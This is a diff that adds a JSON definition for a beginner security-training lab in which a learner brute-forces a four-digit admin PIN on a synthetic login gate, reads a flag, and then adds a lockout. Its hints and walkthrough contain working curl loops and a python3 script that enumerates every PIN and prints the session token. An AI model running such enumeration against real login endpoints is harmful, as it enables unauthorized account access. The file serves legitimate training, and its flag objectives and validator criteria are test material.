@@ -1,0 +1,153 @@
+{
+  "schemaVersion": 1,
+  "id": "brute-force-gate",
+  "version": "1.0.0",
+  "status": "published",
+  "title": "Four Digits",
+  "subtitle": "Enumerate an unprotected admin PIN at Meridian Logistics",
+  "category": "Identity & Access",
+  "difficulty": "Beginner",
+  "estimatedMinutes": 20,
+  "skills": [
+    "Authentication testing",
+    "Automation",
+    "Rate limiting",
+    "Lockout design"
+  ],
+  "summary": "Meridian's admin gate accepts a four-digit PIN with no attempt limit. Recover it, read the operations dashboard, then make guessing impractical.",
+  "scenario": "The Meridian operations gate is meant for after-hours use. There is no attempt limit and no alerting, so a short numeric PIN is the only control. Automate the search, then add a lockout you can defend.",
+  "prerequisites": [
+    "Basic scripting (python3 or bash)",
+    "curl"
+  ],
+  "learningObjectives": [
+    "Automate an authentication search safely",
+    "Understand why short secrets without limits fail",
+    "Design and verify a lockout control"
+  ],
+  "authorizedScope": "Only the Meridian training gate in this session. The PIN and dashboard are synthetic.",
+  "riskSummary": "Unlimited attempts reduce a four-digit PIN to a few thousand requests. Real attacks distribute this across hosts, so volume alone is not a reliable signal.",
+  "remediation": "Lock or slow accounts after a small number of failures, prefer long passphrases or hardware keys, alert on distributed failures, and never use short numeric secrets for admin access.",
+  "conclusion": "You enumerated a four-digit admin PIN, reached the operations dashboard, and then introduced a lockout that stops further guessing.",
+  "baseXp": 120,
+  "workspace": {
+    "image": "cipherforge/workspace:1.2.0",
+    "tools": [
+      "curl",
+      "python3",
+      "jq",
+      "labctl",
+      "bash"
+    ]
+  },
+  "services": [
+    {
+      "name": "app",
+      "role": "target",
+      "app": "brute-force-gate/app/server.mjs",
+      "ports": [
+        {
+          "port": 8080,
+          "protocol": "http",
+          "published": true,
+          "name": "web"
+        }
+      ],
+      "health": {
+        "kind": "http",
+        "path": "/api/health",
+        "expectStatus": 200,
+        "expectBody": "meridian-gate",
+        "timeoutSeconds": 30
+      },
+      "flagObjectives": [
+        "gate-flag"
+      ]
+    }
+  ],
+  "resources": {
+    "cpus": 0.5,
+    "memoryMb": 320,
+    "pids": 96,
+    "writableDiskMb": 64,
+    "maxMinutes": 45,
+    "idleTimeoutMinutes": 20
+  },
+  "network": {
+    "outbound": "deny",
+    "internalPorts": [
+      8080
+    ]
+  },
+  "objectives": [
+    {
+      "id": "gate-flag",
+      "title": "Recover the PIN and read the dashboard",
+      "description": "Enumerate the four-digit PIN, use the issued admin session to read /api/admin/dashboard and submit the marker.",
+      "validation": {
+        "type": "flag",
+        "objectiveKind": "flag",
+        "xp": 45
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "`curl -s -X POST -H 'content-type: application/json' -d '{\"pin\":\"0000\"}' $CF_TARGET_URL/api/admin/login` shows the response shape.",
+          "xpPenalty": 5
+        },
+        {
+          "id": "h2",
+          "text": "Loop the whole 0000-9999 space with python3 requests or curl; stop on the first 200 and read the token.",
+          "xpPenalty": 10
+        }
+      ]
+    },
+    {
+      "id": "lockout",
+      "title": "Enforce a lockout",
+      "description": "Apply a lockout policy. The live check sends repeated wrong PINs, expects a 429, and confirms the correct PIN is also blocked while locked.",
+      "validation": {
+        "type": "check",
+        "objectiveKind": "check",
+        "xp": 60,
+        "validator": "lockout-enforced",
+        "criteria": [
+          "repeated failures return 429",
+          "correct PIN also blocked during lockout",
+          "policy is at least 3 attempts"
+        ]
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "Apply `{\"lockoutAfter\": 5}` with `labctl policy apply -`.",
+          "xpPenalty": 5
+        }
+      ]
+    }
+  ],
+  "validators": [
+    "lockout-enforced"
+  ],
+  "provisioner": {
+    "script": "brute-force-gate/provision.mjs",
+    "timeoutSeconds": 45
+  },
+  "walkthrough": [
+    {
+      "title": "Probe the gate",
+      "body": "Send one wrong PIN and observe that the response counts failures without ever locking.",
+      "snippet": "for i in 1 2 3; do curl -s -o /dev/null -w '%{http_code}\\n' -X POST -H 'content-type: application/json' -d '{\"pin\":\"0000\"}' $CF_TARGET_URL/api/admin/login; done"
+    },
+    {
+      "title": "Find the PIN",
+      "body": "Enumerate the space and stop at the first success.",
+      "snippet": "python3 - <<'PY'\nimport json,urllib.request\nfor pin in range(10000):\n    req=urllib.request.Request('http://127.0.0.1:8080/api/admin/login',data=json.dumps({'pin':f'{pin:04d}'}).encode(),headers={'content-type':'application/json'})\n    try:\n        body=json.load(urllib.request.urlopen(req))\n        print(pin, body['token']); break\n    except Exception: pass\nPY"
+    },
+    {
+      "title": "Gate the door",
+      "body": "Add a lockout and confirm failures stop.",
+      "snippet": "echo '{\"lockoutAfter\": 5}' | labctl policy apply -"
+    }
+  ]
+}
